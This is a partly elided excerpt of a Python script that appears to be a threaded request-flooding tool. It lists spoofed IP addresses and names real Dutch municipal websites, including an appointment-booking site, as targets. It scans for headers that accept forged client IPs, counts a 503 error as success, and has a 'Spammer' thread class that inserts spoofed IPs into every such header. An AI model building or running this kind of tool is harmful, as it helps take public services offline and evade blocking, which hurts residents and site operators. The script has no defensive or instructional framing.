...
spoofed_ips = ['1.3.3.9', "127.0.0.1", "10.10.0.1", '10.20.30.40', '192.168.1.100', '203.0.113.42']

# Target URLs for the additional request block
infinite_loop_urls = [
    "https://veendam.nl"
    "http://veendam.mijnafspraakmaken.nl",
...
# Scan for injectable headers by testing the response
def scan_headers(url):
    ...
    for header in test_headers:
        try:
            ...
            # If the server responds with 503 or other signs of IP spoofing success, keep this header
...
class Spammer(threading.Thread):
    ...
    def request(self):
        ...
        # Add spoofed IPs to all injectable headers
